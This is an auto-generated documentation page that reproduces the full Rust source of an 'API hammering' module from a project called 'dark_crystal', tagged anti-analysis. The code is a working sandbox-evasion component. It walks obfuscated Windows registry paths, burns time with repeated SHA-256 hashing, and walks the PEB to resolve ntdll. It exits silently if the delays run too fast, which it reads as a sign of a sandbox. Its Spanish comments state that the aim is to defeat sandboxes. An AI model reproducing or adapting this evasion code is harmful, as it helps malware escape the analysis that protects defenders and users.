# api_hammering

| Field | Value |
|-------|-------|
| **Source** | `src/dark_crystal/crates/core/src/experimental/api_hammering.rs` |
| **Lines** | 64 |
| **Cards** | T013-anti-analysis |
| **Role** | API hammering (experimental) |
| **Feature gates** | hammering |

## Public API

### `hammer` (line 6)
```rust
pub fn hammer(seed: u32)
```
API Hammering polimórfico.
Consume tiempo real del sandbox de formas que NO son sleeps obvios.

## Internal Functions

- `registry_deep_walk` (line 26)
- `crypto_waste_time` (line 44)
- `verify_loaded_modules` (line 57)

## Key Dependencies

- `use sha2::{Digest, Sha256};`

## Full Source

```rust
use sha2::{Digest, Sha256};
use std::time::{Duration, Instant};

/// API Hammering polimórfico.
/// Consume tiempo real del sandbox de formas que NO son sleeps obvios.
pub fn hammer(seed: u32) {
    let start = Instant::now();

    // === TÉCNICA 1: Registry Enumeration ===
    registry_deep_walk();

    // === TÉCNICA 2: Cripto iterativo ===
    crypto_waste_time(seed, 200_000);

    // === TÉCNICA 3: PEB walk para verificar módulos ===
    verify_loaded_modules();

    // === TÉCNICA 4: Detección de aceleración de sandbox ===
    let elapsed = start.elapsed();
    if elapsed < Duration::from_millis(100) {
        // Si todo lo anterior tomó muy poco tiempo, el sandbox está acelerando el reloj.
        std::process::exit(0);
    }
}

fn registry_deep_walk() {
    #[cfg(feature = "hammering")]
    {
        let keys = [
            crate::obf!("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall"),
            crate::obf!("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion"),
            crate::obf!("SYSTEM\\CurrentControlSet\\Services"),
        ];
        for key_path in &keys {
            if let Ok(hklm) =
                winreg::RegKey::predef(winreg::enums::HKEY_LOCAL_MACHINE).open_subkey(key_path)
            {
                for _ in hklm.enum_keys().flatten().take(20) {}
            }
        }
    }
}

fn crypto_waste_time(seed: u32, iterations: u32) {
    let mut buffer = seed.to_le_bytes().to_vec();
    buffer.extend_from_slice(&seed.wrapping_mul(0x9e3779b9).to_le_bytes());
    for i in 0..iterations {
        let mut hasher = Sha256::new();
        hasher.update(&buffer);
        buffer = hasher.finalize().to_vec();
        if i % 50_000 == 0 {
            buffer.extend_from_slice(&i.to_le_bytes());
        }
    }
}

fn verify_loaded_modules() {
    // Reutilizamos la lógica del PEB walk de forma simplificada
    // para enumerar y "validar" el entorno de forma creíble.
    let (base, _) = crate::sys_resolve::ntdll_base_and_name_hashes();
    if base.is_null() {
        // Something is very wrong
    }
}

```